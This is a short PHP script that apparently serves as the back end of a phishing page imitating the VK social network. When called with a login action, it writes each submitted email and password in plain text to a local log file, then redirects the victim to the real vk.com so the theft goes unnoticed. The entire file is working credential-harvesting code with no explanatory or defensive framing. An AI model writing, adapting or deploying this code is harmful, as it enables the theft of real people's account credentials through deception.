<?php

$logfile = "log.txt";

if ($_GET['act'] == 'login'){

	$email = $_POST['email'];
	$pass = $_POST['pass'];

	$log = fopen($logfile, "a+");
	fwrite($log, "[ EMAIL: $email | PASS: $pass ]\n");
	fclose($log);

	header("Location: https://vk.com");

}else{

	header("Location: index.html");

}

?>